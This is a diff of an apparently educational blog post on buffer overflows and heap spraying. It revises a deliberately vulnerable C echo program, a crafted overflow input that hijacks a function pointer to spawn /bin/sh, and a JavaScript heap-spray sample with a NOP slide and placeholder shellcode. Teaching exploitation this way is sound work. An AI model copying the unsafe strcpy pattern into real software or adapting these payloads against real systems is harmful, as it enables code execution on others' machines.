@@ -7,6 +7,12 @@ category: "Security"
 Buffer overflows is one of most common bugs in C/C++ programs.
 <br />
 Let's talk about some common buffer overflows.
+<div>
+  <img 
+    src='https://media.giphy.com/media/l2JJNISY3AgGENJzq/giphy.gif' 
+    style="height: 50%; width:50%"
+  >
+</div>
 
 ### Stack Smashing
 
@@ -91,35 +97,54 @@ char *hexify_str(char *str);
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
-#include <sys/types.h>
 #include "target.h"
 #include "utils.h"
 
 #define BUF_SIZE 16
 
-int bar(char *arg, char *out) {
+int bar(char *arg, char *out)
+{
   strcpy(out, arg);
   return 0;
 }
 
-void start_sh() {
-  system("/bin/sh");
+void baz(char *word)
+{
+  printf("You said: %s\n", word);  
 }
 
-void echo(char *word) {
+void dontcall(int skip_reset) {
+  static int ct = 0;
+  if (!skip_reset) {
+    ct = 0;
+    return;
+  }
+  ct += 1;
+  if (ct == 2) {
+  	system("/bin/sh");
+  }
+}
+
+void echo(char *word)
+{
+  dontcall(0);
+  void (*printer)(char *);
   char buf[BUF_SIZE];
   for (int i = 0; i < BUF_SIZE; i++) {
-    buf[i] = 0;
+    buf[i] = '\0';
   }
-  hexify_str(word); 
+  
+  hexify_str(word);
+  printer = &baz;
   bar(word, buf);
-  printf("You said: %s\n", buf);
+  printer(buf);
 }
 
 void print_func_digest() {
   printf("Function digest: \n");
   printf("  bar      is at address: %p\n", bar);
-  printf("  start_sh is at address: %p\n", start_sh);
+  printf("  baz      is at address: %p\n", baz);
+  printf("  dontcall is at address: %p\n", dontcall);
   printf("  echo     is at address: %p\n", echo);
 }
 ```
@@ -156,36 +181,92 @@ Welcome! I echo what you say. Enter Ctrl-C to stop the program.
 
 Function digest:
   bar       is at address: 0x80485cf
-  start_sh  is at address: 0x80485e7
-  echo      is at address: 0x80485fa
+  baz       is at address: 0x80485e7
+  dontcall  is at address: 0x80485fd
+  echo      is at address: 0x8048638
 
 ------------------------------
 Your input:
 ```
 
-The process flow is 
+Within the loop, the process flow is 
 1. get input stream and store it to a input buffer.
 2. preprocessing
-3. execute echo function, which copies input buffer to the other buffer with size of 16 bytes
+3. execute 'echo' function, which copies input buffer to the other buffer with size of 16 bytes
 4. postprocessing
 
-> What if the input is '1...2...3...4...5...6...\xe7\x85\x04\x08'
+> What if the input is '1...2...3...4...\xfd\x85\x04\x08.123.123\xe7\x85\x04\x08'
 
 <b>
   The first 16 bytes fulfill the buffer,
+  <br />
+  next 4 bytes overwrite the function pointer with the address dontcall,
   <br />
   next 4 bytes are local variable (int i), 
   <br />
   and next 4 bytes take care of stack frame pointer.
   <br />
   And finally the rest overwrites return address.  
+  </br>
 </b>
 
 <div>
   <img 
     src='https://storage.googleapis.com/warrenlee/myBlog/buffer%20overflows/stack.jpg' 
-    style="height: 60%; width:60%"
+    style="height: 80%; width:80%"
+  >
+</div>
+
+Then we receive a shell prompt
+
+<div>
+  <img 
+    src='https://media.giphy.com/media/102h4wsmCG2s12/giphy.gif' 
+    style="height:50%; width:50%"
   >
 </div>
 
 ### Heap Spraying
+
+According to http://www.fuzzysecurity.com/tutorials/expDev/8.html
+> The concept of "heap spraying" was first introduced by blazde and SkyLined in 2004 when it was used in the Internet Explorer iframe tag buffer overflow exploit. This same generic technique has been used by most browser exploits up to IE7, firefox 3.6.24, Opera 11.60.
+
+The idea is basically to spray heap with shell code. 
+And it would increase the possibility for buffer overflow to execute those shell code.
+<div>
+  <img 
+    src='https://storage.googleapis.com/warrenlee/myBlog/buffer%20overflows/heap-spraying.jpg' 
+    style="height:60%; width:60%"
+  >
+</div>
+
+### Sample JS code
+
+```html
+<html>
+  <body>
+    <script language='javascript'>
+      var Shellcode = unescape(
+      '%u7546%u7a7a%u5379'+   // ASCII
+      '%u6365%u7275%u7469'+   // FuzzySecurity
+      '%u9079');              //
+      
+      var NopSlide = unescape('%u9090%u9090');
+        
+      var headersize = 20;
+      var slack = headersize + Shellcode.length;
+        
+      while (NopSlide.length < slack) NopSlide += NopSlide;
+      var filler = NopSlide.substring(0,slack);
+      var chunk = NopSlide.substring(0,NopSlide.length - slack);
+        
+      while (chunk.length + slack < 0x40000) chunk = chunk + chunk + filler;
+      var memory = new Array();
+      for (i = 0; i < 500; i++){ memory[i] = chunk + Shellcode }
+
+      alert("allocation done");
+    </script>
+  </body>
+</html>
+```
+
